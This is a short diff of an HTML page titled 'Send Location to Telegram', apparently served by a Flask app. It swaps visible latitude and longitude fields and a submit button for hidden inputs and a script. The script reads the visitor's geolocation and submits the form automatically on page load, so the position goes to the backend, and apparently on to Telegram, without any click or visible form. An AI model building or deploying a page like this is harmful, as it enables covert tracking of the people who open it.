@@ -5,23 +5,22 @@
 </head>
 <body>
     <h1>Send Location to Telegram</h1>
-    <form action="/send_location" method="post">
-        <label for="latitude">Latitude:</label>
-        <input type="text" name="latitude" id="latitude"><br>
-        <label for="longitude">Longitude:</label>
-        <input type="text" name="longitude" id="longitude"><br>
-        <input type="submit" value="Send Location">
-    </form>
-    
-    <h1>Send IP Address to Telegram</h1>
-    <form action="/send_ip" method="post">
-        <input type="submit" value="Send IP Address">
+    <form id="location-form" action="/send_location" method="post">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
     </form>
     
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            document.getElementById("latitude").value = position.coords.latitude;
-            document.getElementById("longitude").value = position.coords.longitude;
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            
+            // Set the latitude and longitude values on the form
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
+            
+            // Submit the form to send the location to the Flask app
+            document.getElementById("location-form").submit();
         });
     </script>
 </body>
